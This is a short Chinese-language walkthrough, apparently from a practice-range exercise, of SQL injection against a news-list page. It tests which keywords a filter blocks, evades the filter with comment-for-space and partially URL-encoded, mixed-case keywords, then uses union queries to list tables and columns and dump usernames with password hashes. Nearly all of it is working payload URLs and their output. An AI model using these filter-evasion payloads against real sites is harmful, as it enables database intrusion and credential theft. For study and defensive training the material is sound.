```
先检测过滤了那些内容
http://219.153.49.228:45867/new_list.php?id=1' //网页无法运行
http://219.153.49.228:45867/new_list.php?id=1 and 1 = 2 //被检测到了
http://219.153.49.228:45867/new_list.php?id=1 and      //被检测到了
http://219.153.49.228:45867/new_list.php?id=1%20and    //被检测到了
http://219.153.49.228:45867/new_list.php?id=1/**/and   //未被检测  判定是检测了空格' '  这个空格转义了也不行

  
四个字段
http://219.153.49.228:45867/new_list.php?id=-1/**/union/**/select/**/1,2,3,4/**/--+  //被检测了
http://219.153.49.228:45867/new_list.php?id=-1%2F%2A%2A%2F%75%6e%69%6f%6e%2F%2A%2A%2F%73%65%6c%65%63%74%2F%2A%2A%2F%31%2C%32%2C%33%2C%34%2F%2A%2A%2F%2D%2D%2B //被检测了
http://219.153.49.228:45867/new_list.php?id=1/**/union  //被检测了  union 被检测
http://219.153.49.228:45867/new_list.php?id=1/**/select  //被检测了  select 被检测
http://219.153.49.228:45867/new_list.php?id=1/**/from  //被检测了  from 被检测
对select、union、select进行特殊处理
http://219.153.49.228:45867/new_list.php?id=1/**/and/**/%73%65lEct //SELECT 不被检测 编码过后：%73%65lEct
http://219.153.49.228:45867/new_list.php?id=1/**/and/**/%75%6eIoN //union 不被检测 编码过后：%75%6eIoN
http://219.153.49.228:45867/new_list.php?id=1/**/and/**/%66%72Om   //  from 不被检测 编码过后：%66%72Om
查询显示位置
http://219.153.49.228:45867/new_list.php?id=-1/**/%75%6eIoN/**/%73%65lEct/**/1,2,3,4   // 2 3
查询表名
http://219.153.49.228:45867/new_list.php?id=-1/**/%75%6eIoN/**/%73%65lEct/**/1,2,(%73%65lEct/**/group_concat(table_name)/**/%66%72Om/**/information_schema.tables/**/where/**/table_schema=database()),4  // notice,stormgroup_member
查询字段名
http://219.153.49.228:45867/new_list.php?id=-1/**/%75%6eIoN/**/%73%65lEct/**/1,2,(%73%65lEct/**/group_concat(column_name)/**/%66%72Om/**/information_schema.columns/**/where/**/table_name='stormgroup_member'),4  // id,length,name,password,time,status
查询字段内容
http://219.153.49.228:45867/new_list.php?id=-1/**/%75%6eIoN/**/%73%65lEct/**/1,2,(%73%65lEct/**/group_concat(name,'-',password)/**/%66%72Om/**/stormgroup_member/**/),4 //
mozhe01-d1bff12cf951bbb9f8d1c3e59620255b
mozhe2-a6babd9eb561e9ffd6f5aad28851daa7
admin-52a82a9c929b472cd6e087033d122476
 
```

URL编码以后也被检测



